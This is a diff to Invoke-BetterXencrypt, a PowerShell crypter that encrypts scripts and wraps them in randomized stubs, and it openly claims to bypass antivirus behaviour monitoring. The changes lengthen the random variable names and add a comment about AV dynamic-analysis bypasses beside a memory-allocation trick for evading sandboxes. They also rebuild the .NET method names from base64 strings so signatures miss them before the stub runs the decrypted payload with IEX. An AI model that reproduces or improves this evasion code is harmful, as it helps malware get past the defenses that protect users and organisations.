@@ -6,7 +6,7 @@ function Create-Var() {
         #Variable length help vary the length of the file generated
         #old: [guid]::NewGuid().ToString().Substring(24 + (Get-Random -Maximum 9))
         $set = "abcdefghijkmnopqrstuvwxyz"
-        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 6 -Maximum $set.Length)] } ) -join ''
+        (1..(10 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 6 -Maximum $set.Length)] } ) -join ''
 }
 
 function Invoke-BetterXencrypt {
@@ -29,7 +29,7 @@ function Invoke-BetterXencrypt {
      The output script is highly randomized in order to make static analysis even more difficut.
      It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
      Not only that,Invoke-BetterXencrypt-ed script can bypass any behavior monitoring from AVs
-     Version : v1.1.0
+     Version : v1.2.0
     .PARAMETER InFile
     Specifies the script to encrypt.
     .PARAMETER OutFile
@@ -139,10 +139,9 @@ function Invoke-BetterXencrypt {
             # write
             Write-Output "[*] Finalizing code layer ..."
 
-            # now, randomize the order of any statements that we can to further increase variation
-
             $stub_template = ''
 
+            # some AV's Dynamic Analysys bypasses
             $code_alternatives  = @()
             $code_alternatives += '${30} = (Get-Process -Id $PID | Select-Object Name,@{17}Name="WorkingSet";Expression={17}($_.ws / 1024kb){18}{18}).WorkingSet' + "`r`n"
             $code_alternatives += 'if (${30} -lt 250) {17} ${31} = "a" * 300MB {18}' + "`r`n"
@@ -191,8 +190,8 @@ function Invoke-BetterXencrypt {
             }
             #paddingmode but its base64 encoded and reversed ;)
             if ($paddingmode -eq 'PKCS7') {
-                $code_alternatives += '${27} = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"'
-                $code_alternatives += '${28} = ${27}.ToCharArray()'
+                $code_alternatives += '${27} = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
+                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                 $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
                 $code_alternatives += '${29} = -join(${28})' + "`r`n"
                 $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"
@@ -245,14 +244,18 @@ function Invoke-BetterXencrypt {
             $code_alternatives += '${5}.Close()' + "`r`n"
             $code_alternatives += '${4}.Dispose()' + "`r`n"
             $code_alternatives += '${6}.Close()' + "`r`n"
-            $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
+            $code_alternatives += '${30} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))' + "`r`n"
+            $code_alternatives += '${31} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))' + "`r`n"
+            $code_alternatives += '${32} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))' + "`r`n"
+            $code_alternatives += '${33} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))' + "`r`n"
+            $code_alternatives += '${8} = ${30}::${31}.${33}(${7}.${32}())' + "`r`n"
             $stub_template += $code_alternatives -join ''
 
             $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
             
         
             # it's ugly, but it beats concatenating each value manually.
-            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
+            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
             $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
         }
         Write-Output "[*] Writing '$($outfile)' ..."
